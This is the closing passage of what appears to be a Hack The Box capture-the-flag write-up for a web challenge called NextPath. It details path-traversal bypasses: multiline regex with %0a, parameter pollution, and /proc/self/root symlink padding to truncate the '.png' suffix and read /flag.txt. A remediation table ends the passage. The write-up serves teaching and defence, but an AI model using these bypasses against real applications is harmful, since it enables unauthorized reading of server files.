                            <th>Segment</th>
                            <th>Chars</th>
                            <th>Running Total</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>..</code></td>
                            <td>2</td>
                            <td><strong>2</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/thread-self/root</code></td>
                            <td>22</td>
                            <td><strong>24</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/thread-self/root</code></td>
                            <td>22</td>
                            <td><strong>46</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/self/root</code></td>
                            <td>15</td>
                            <td><strong>61</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/self/root</code></td>
                            <td>15</td>
                            <td><strong>76</strong></td>
                        </tr>
                        <tr>
                            <td><code>/proc/self/root</code></td>
                            <td>15</td>
                            <td><strong>91</strong></td>
                        </tr>
                        <tr>
                            <td><code>/flag.txt</code></td>
                            <td>9</td>
                            <td><strong>100</strong> âœ“</td>
                        </tr>
                    </tbody>
                </table>

                <p>With <code>.png</code>: 104 chars â†’ <code>slice(0, 100)</code> â†’ <code>.png</code> removed â†’ clean
                    <code>/flag.txt</code> path.
                </p>

                <h3>Filesystem Resolution</h3>

                <pre><code>..                        â†’  /   (up from /app)
proc/thread-self/root     â†’  /   (symlink â†’ /proc/&lt;pid&gt;/task/&lt;tid&gt;/root â†’ /)
proc/thread-self/root     â†’  /   (same)
proc/self/root            â†’  /   (symlink â†’ /)
proc/self/root            â†’  /   (same)
proc/self/root            â†’  /   (same)
flag.txt                  â†’  /flag.txt âœ“</code></pre>

                <h3>Result</h3>

                <pre><code>HTB{REDACTED}</code></pre>

                <h2 id="s6">6. Full Attack Chain Summary</h2>

                <pre><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                     NEXTPATH EXPLOIT CHAIN                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Bypass 1 â”‚ Multiline regex (/m flag)                               â”‚
â”‚          â”‚ %0a newline â†’ "1337" passes ^[0-9]+$ on its own line    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Bypass 2 â”‚ HTTP Parameter Pollution                                â”‚
â”‚          â”‚ Two id params â†’ Array.includes() checks elements,       â”‚
â”‚          â”‚ not substrings â†’ "/" and ".." checks defeated            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Bypass 3 â”‚ .png truncation via slice(0, 100)                       â”‚
â”‚          â”‚ Symlink loops (/proc/*/root â†’ /) pad the path to        â”‚
â”‚          â”‚ land the filename at exactly char 100                    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Bypass 4 â”‚ Modular arithmetic lock broken by /proc/thread-self     â”‚
â”‚          â”‚ 22 chars (mod 3 = 1) breaks the deadlock that           â”‚
â”‚          â”‚ /proc/1/root (12) and /proc/self/root (15) couldn't     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</code></pre>

                <h2 id="s7">7. Remediation</h2>

                <table>
                    <thead>
                        <tr>
                            <th>Vulnerability</th>
                            <th>Fix</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Multiline regex</td>
                            <td>Remove <code>m</code> flag: <code>/^[0-9]+$/</code></td>
                        </tr>
                        <tr>
                            <td>Array parameter pollution</td>
                            <td>Validate <code>typeof query.id === 'string'</code>, reject arrays</td>
                        </tr>
                        <tr>
                            <td>Path traversal check</td>
                            <td>Use <code>path.resolve()</code> and verify the result is within the allowed directory
                            </td>
                        </tr>
                        <tr>
                            <td>Truncation-based extension removal</td>
                            <td>Don't truncate; use proper file extension handling or serve from a whitelist</td>
                        </tr>
                    </tbody>
                </table>

                <div class="pwned-banner">
                    <span class="pwned-icon">ğŸ´</span>
                    <div class="pwned-text">Machine Pwned</div>
                    <p class="pwned-sub">Regex Bypass â†’ HPP â†’ Path Truncation â†’ Flag captured</p>
                </div>

            </div>
        </article>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2025 Abdelaaziz Belkhair</p>
        </div>
    </footer>
</body>

</html>